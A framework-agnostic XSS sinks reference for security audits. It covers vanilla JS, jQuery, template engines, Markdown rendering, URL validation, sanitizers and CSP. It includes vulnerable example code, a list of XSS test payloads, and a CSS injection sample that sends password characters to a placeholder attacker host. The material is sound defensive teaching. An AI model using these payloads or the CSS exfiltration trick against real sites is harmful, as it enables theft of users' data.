# XSS Sinks Reference (Framework-Agnostic)

For React-specific JSX sinks, see `appsec-stack-pack/react-security/references/jsx-xss-sinks.md`. This reference covers the broader landscape: vanilla JS, server-rendered templates, less common frameworks, and the universal sink categories every audit should cover.

## The five categories of XSS sinks

Every XSS bug fits into one of these:

| Category | Sink | Defense |
|----------|------|---------|
| **HTML injection** | `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write` | Avoid; use textContent or sanitize with DOMPurify |
| **Attribute injection** | `href`, `src`, `style`, `formaction`, event handlers | Validate URLs; allowlist styles |
| **JavaScript injection** | `eval`, `new Function`, `setTimeout(string)`, `setInterval(string)` | Never with user input |
| **Template injection** | Server-side template engines (ERB, Jinja, Twig, Velocity) | Auto-escape; don't render user input as template |
| **DOM-based injection** | URL fragment, postMessage, document.referrer flowing to a sink | Validate at source AND at sink |

## Sinks by frontend approach

### Vanilla JS

```js
// All XSS sinks:
element.innerHTML = userInput;             // ⚠
element.outerHTML = userInput;             // ⚠
element.insertAdjacentHTML('beforeend', userInput);   // ⚠
document.write(userInput);                 // ⚠
document.writeln(userInput);               // ⚠
new DOMParser().parseFromString(userInput, 'text/html');  // careful — depends on how output is used
```

Safe alternatives:
```js
element.textContent = userInput;           // ✓ escapes everything
element.setAttribute('data-name', userInput);  // ✓ escapes for attributes (NOT for event handlers / href / src)
```

### jQuery (legacy)

```js
$('#x').html(userInput);                   // ⚠ same as innerHTML
$('#x').append(userInput);                 // ⚠ parses HTML
$('<div>' + userInput + '</div>');         // ⚠ HTML parsing in selector
```

Safe:
```js
$('#x').text(userInput);                   // ✓
```

### Server-side templates

| Engine | Auto-escape | Bypass |
|--------|-------------|--------|
| Jinja2 (Python) | Yes | `\|safe` filter, `Markup()` |
| Django Templates | Yes | `\|safe`, `mark_safe()` |
| ERB (Ruby) | Yes (Rails 3+) | `raw()`, `html_safe`, `<%==`  |
| Twig (PHP) | Yes | `\|raw` |
| Handlebars / Mustache | Triple-brace `{{{var}}}` bypasses; double-brace `{{var}}` safe | `{{{var}}}` |
| EJS | NOT by default; use `<%= %>` for escaped, `<%- %>` for raw | `<%- %>` |
| Pug (Jade) | Yes | `!{var}` |
| Velocity (Java) | Configurable | depends |
| Thymeleaf (Java) | Yes | `th:utext` |
| Razor (.NET) | Yes | `@Html.Raw()` |
| Liquid (Shopify, Jekyll) | Yes | none in standard Liquid; custom filters can |

For each, audit the bypasses in your codebase.

### Markdown-to-HTML

Most Markdown renderers allow raw HTML by default. After rendering, you have HTML — sanitize.

```js
// marked (Node)
import { marked } from 'marked';
import DOMPurify from 'isomorphic-dompurify';
const html = DOMPurify.sanitize(marked.parse(userMarkdown));
```

```python
# markdown-it-py (Python)
from markdown_it import MarkdownIt
from bleach import clean
html = clean(MarkdownIt().render(user_markdown), tags=['p','strong','em','a','ul','ol','li','code','pre'])
```

Disable raw HTML in the renderer where possible:

```js
marked.use({ renderer: { html: () => '' } });   // strip raw HTML blocks
```

## URL injection (href / src / formaction)

Attributes that load resources or execute on activation. Validate the URL scheme.

```js
const SAFE_SCHEMES = new Set(['http:', 'https:', 'mailto:', 'tel:', 'sms:']);

function safeUrl(input, fallback = '#') {
  if (typeof input !== 'string') return fallback;
  try {
    const u = new URL(input, location.origin);
    return SAFE_SCHEMES.has(u.protocol) ? u.toString() : fallback;
  } catch { return fallback; }
}
```

The pattern is universal — same logic in JSX, Vue, Svelte, jQuery, server templates.

## DOM-based XSS via URL fragment / postMessage

The source isn't a server response — it's something in the page already.

### Hash / fragment

```js
// User clicks: example.com/page#<img src=x onerror=alert(1)>
const name = decodeURIComponent(location.hash.slice(1));
document.body.innerHTML = `Hello ${name}`;   // ⚠ XSS from fragment
```

Audit `location.hash`, `location.search`, `location.pathname` flowing into innerHTML.

### postMessage

```js
window.addEventListener('message', (e) => {
  // BAD — accepts any origin
  document.getElementById('out').innerHTML = e.data;
});
```

Safe pattern:
```js
window.addEventListener('message', (e) => {
  if (e.origin !== 'https://expected.origin.com') return;
  if (typeof e.data !== 'string') return;
  document.getElementById('out').textContent = e.data;
});
```

### document.referrer

Same class — comes from the browser, attacker-influenced. Don't innerHTML it.

## JavaScript code injection

```js
eval(userInput);                           // ⚠ RCE
new Function(userInput)();                 // ⚠ RCE
setTimeout(userInput, 1000);               // ⚠ if userInput is a string, runs as code
setInterval(userInput, 1000);              // ⚠ same
```

Use parameterized callbacks:
```js
setTimeout(() => doSomething(userInput), 1000);   // ✓ user input as data, not code
```

## CSS-based exfiltration

Less commonly understood: CSS can leak data. Attacker injects a stylesheet with:

```css
input[value^="a"] { background-image: url('https://attacker/a'); }
input[value^="b"] { background-image: url('https://attacker/b'); }
/* etc. */
```

If user-supplied CSS is rendered, each character of (e.g.) a password input value triggers a different network request — exfiltrating character-by-character.

- If you accept user CSS at all, restrict to a property allowlist.
- Block `background-image`, `content`, `cursor`, `list-style-image`, `@font-face`, and any property accepting `url()`.

## Sanitization libraries

| Library | Language | Use for |
|---------|----------|---------|
| DOMPurify | JS (browser/Node) | General HTML sanitization |
| sanitize-html | Node | Server-side HTML sanitization with config |
| bleach | Python | HTML / attributes / styles |
| html-sanitizer | Python | Markdown-style allowlist |
| sanitize_html (Rails) | Ruby | Built-in |
| HTMLPurifier | PHP | Battle-tested |
| OWASP Java HTML Sanitizer | Java | Configurable policies |
| Ammonia | Rust | HTML sanitization |
| Bluemonday | Go | HTML sanitization |

Always sanitize on the server before storage; sanitize again on the client before rendering as defense-in-depth. Don't trust client-only sanitization — attackers can submit raw HTML directly to the API.

## Content Security Policy as defense-in-depth

CSP doesn't replace input validation but reduces the impact of any XSS that slips through:

```
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'nonce-{random}';
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
```

Nonces on every script/style; reject inline scripts. An injected `<script>alert(1)</script>` won't execute because it has no matching nonce.

See `saas-frontend-hardening` for full CSP configuration.

## Audit checklist

For each input → sink path in the code:

1. Identify the sink (innerHTML, eval, etc.).
2. Trace back to the source (server response, URL, postMessage, user form, etc.).
3. Does the path include sanitization? Is it appropriate (context-aware)?
4. Is the sanitization at write-time (canonical) or read-time (display only)? Both is safer.
5. Does CSP defense-in-depth limit impact if a bug exists?
6. Is the test suite covering XSS payloads for this path?

Common payloads to test:
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
<a href=javascript:alert(1)>x</a>
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

If any of these end up rendered as live HTML / executing, you have a finding.
